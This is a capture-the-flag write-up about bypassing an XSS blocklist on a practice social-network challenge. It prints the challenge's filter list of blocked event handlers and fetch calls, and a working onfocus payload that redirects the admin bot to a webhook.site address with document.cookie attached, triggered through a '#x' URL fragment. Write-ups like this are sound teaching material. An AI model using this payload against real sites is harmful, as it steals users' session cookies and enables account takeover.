# CTF Writeup: Unhackable Social Network

## The Challenge
We were given the source code for a social network called "FaceTagramTokBook but the second one where it's way harder". The challenge description mentioned that the admin added a filter to prevent Cross-Site Scripting (XSS) attacks. Our goal was to find a way to bypass this filter, execute code in the admin's browser, and steal their secret cookie, which contained the flag.

We were also given a "report" page where we could submit a URL to an admin bot, which would then visit the link. This meant if we could create a malicious link that bypassed the filter, we could send it to the admin and steal their cookie!

## The Vulnerability (The Flaw)
Looking at the source code (`app.py`), we found the filter the admin was so proud of:

```python
# filter out XSS!
# blocks the most common event handlers and exfiltration primitives
_BLOCKED = [
    "script", "fetch", "xmlhttprequest",
    "onload", "onerror", "ontoggle", "onmouseover", "onmouseenter",
    "onmouseleave", "onmouseout", "onmousedown", "onmouseup", "ondblclick",
    "onclick", "onscroll", "onwheel", "onresize", "onkeydown", "onkeyup",
    "onkeypress", "onsubmit", "onchange", "oninput", "onblur",
    "oncontextmenu", "onpointerover", "onpointerdown", "onpointerup",
    "onpageshow", "onpagehide", "onhashchange", "onanimation", "ontransition",
]
```

This filter blocks many common ways hackers use to run malicious JavaScript code in a website (like `onclick` or `<script>`). However, filters like this are notoriously hard to get perfectly right because they rely on a blocklist (blocking specific bad things) rather than an allowlist (only allowing specific good things). If the developer forgets to block even one dangerous word, a hacker can use it.

By reading through the list, we noticed a critical omission: the `onfocus` event handler was **not** blocked!

## The Exploit (The Attack)

### Step 1: Crafting the Payload
The `onfocus` event triggers when an element on the page is focused (like when you click on a text input box or use the Tab key to navigate to a link). We can make an element focus itself automatically when the page loads by using the URL. If a URL ends with `#elementID`, the browser will automatically scroll to and focus the element with that ID.

We created the following malicious "post":
```html
<a id="x" tabindex="1" onfocus="document.location=`https://webhook.site/your-webhook-url?c=${document.cookie}`">Focus here</a>
```

Here's how it works in plain English:
1. `id="x"`: We give our link the name "x" so we can point to it later.
2. `tabindex="1"`: This makes the link focusable, even though it's just text.
3. `onfocus="..."`: This is the JavaScript code that will run when the link is focused.
4. `document.location=...`: Since the filter blocked `fetch` and `xmlhttprequest` (the standard ways to send data in the background), we used `document.location` to just redirect the user to a completely different website.
5. `${document.cookie}`: This grabs the secret cookie of whoever looks at the post and attaches it to the URL they are redirected to.
6. `https://webhook.site/...`: This is a temporary "catch-all" server we control. When the admin is redirected here, their secret cookie will be logged in our webhook dashboard!

### Step 2: Planting the Trap
We went to the "Write a new post" page and submitted our malicious code as the content of the post. The server accepted it because `onfocus` and `document.location` were not in the blocked list.

The server gave us a link to view our post, something like:
`https://onpoint.chals.cyberjousting.com/getpost?id=1234567890abcdef`

### Step 3: Springing the Trap
Now we needed the admin to look at our post, but we also needed the `onfocus` event to trigger automatically. We did this by adding `#x` to the end of the URL (pointing to the `id="x"` we set earlier).

We went to the "report" page and submitted the full link:
`https://onpoint.chals.cyberjousting.com/getpost?id=1234567890abcdef#x`

### Step 4: Capturing the Flag
The admin bot visited the link. Because of the `#x` at the end of the URL, the browser immediately focused on our malicious link. The `onfocus` event triggered, and the JavaScript redirected the admin bot to our Webhook site, carrying their secret cookie along for the ride.

We checked our Webhook dashboard, and sure enough, a new request popped up with the cookie:
`flag=byuctf{I_w4s_sur3_th1s_0ne_w4a_b3tt3r...}`

We got the flag!